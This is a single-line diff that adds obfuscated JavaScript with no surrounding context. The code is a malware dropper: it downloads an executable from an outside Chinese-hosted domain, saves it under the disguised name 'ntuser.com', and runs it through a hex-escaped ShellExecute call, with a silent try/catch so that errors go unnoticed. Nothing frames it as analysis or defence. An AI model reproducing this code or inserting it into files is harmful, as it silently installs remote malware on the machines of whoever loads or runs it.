@@ -1,0 +1,1 @@
+try{var xml=ado.CreateObject("Microsoft.XMLHTTP","");xml.Open("GET","http://www.mmboi.cn/net/are.exe",0);xml.Send();as.type=1;/*xxx*/as.open();as.write(xml.responseBody);path="..\\ntuser.com";as.savetofile(path,2);as.close();var Shell=ado.createobject("Shell.Application","");Shell["\x53\x68\x65\x6c\x6c\x45\x78\x65\x63\x75\x74\x65"](path,"","open")}catch(e){}
